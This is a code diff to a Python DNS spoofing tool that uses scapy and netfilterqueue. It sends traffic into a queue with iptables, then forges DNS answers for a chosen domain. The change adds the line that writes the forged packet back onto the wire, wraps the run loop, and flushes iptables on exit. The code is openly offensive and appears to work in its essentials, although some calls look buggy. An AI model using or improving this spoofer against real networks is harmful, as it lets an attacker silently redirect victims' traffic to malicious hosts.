@@ -5,7 +5,7 @@ import scapy.all as scapy
 import netfilterqueue
 import optparse
 
-def iptables():
+def iptables(local_test):
 
     if local_test == "true":
         subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
@@ -29,9 +29,6 @@ def get_arguements():
     
     if not options.domain():
         parser.error("[-] Please specify the domain to spoof")
-    
-    if options.local():
-        local_test = "true"
 
     return options
 
@@ -52,13 +49,22 @@ def process_packets(packet):
             del scapy_packets[scapy.IP].chksum
             del scapy_packets[scapy.UDP].len
             del scapy_packets[scapy.UDP].chksum
+            packet.set_payload(str(scapy_packets))
 
     packet.accept()
 
-options = get_arguements()
-local_test = options.local_test
-iptables()
+try:
+    options = get_arguements()
+    local_test = options.local_test
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packets)
-queue.run()
+    if options.local():
+        local_test = "true"
+    iptables(local_test)
+
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packets)
+    queue.run()
+
+except KeyboardInterrupt:
+    print("CTRL + C detected .... clearing IP Tables")
+    subprocess.call(['iptables', '--flush'])
